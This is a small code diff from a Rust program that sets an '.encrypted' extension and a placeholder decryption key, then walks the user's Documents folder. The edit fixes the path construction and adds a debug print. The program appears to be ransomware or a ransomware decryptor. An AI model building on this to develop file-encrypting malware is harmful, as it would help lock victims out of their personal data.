@@ -9,7 +9,9 @@ fn main() -> Result<(), Box<dyn Error>> {
 	let encrypted_extension = ".encrypted";
 	let key = "INSERT_DECRYPTION_KEY_HERE";
 
-	let target_dir = format!("C:\\Users\\{:?}\\Documents", home_dir());
+	let target_dir = format!("{}\\Documents", home_dir().unwrap_or("~".into()).to_string_lossy());
+	println!("{}", target_dir);
+
 	let entries = fs::read_dir(target_dir)?;
 	for entry in entries {
 		let entry = entry?;
